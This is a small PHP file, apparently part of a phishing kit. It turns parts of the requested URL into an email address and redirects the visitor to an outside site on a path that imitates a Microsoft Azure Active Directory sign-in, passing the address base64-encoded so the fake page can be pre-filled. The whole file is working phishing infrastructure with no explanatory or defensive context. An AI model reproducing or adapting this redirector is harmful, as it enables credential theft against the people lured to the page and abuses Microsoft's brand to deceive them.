<?php

$a = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

$b = explode('/', $a);
$part_2 = $b[2];
$part_3 = $b[3];
$part_4 = $b[4];
$part_5 = $b[5];

$mail = $part_3 .  "@" . $part_4 . "." . $part_5;

function Redirect($url, $permanent = false)
{
 if (headers_sent() === false)
 {
 header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
 }

 exit();
}

Redirect("https://consalt.com.co/account-activedirectory-windowsazure/?email=" . base64_encode($mail) . "", false);


?>

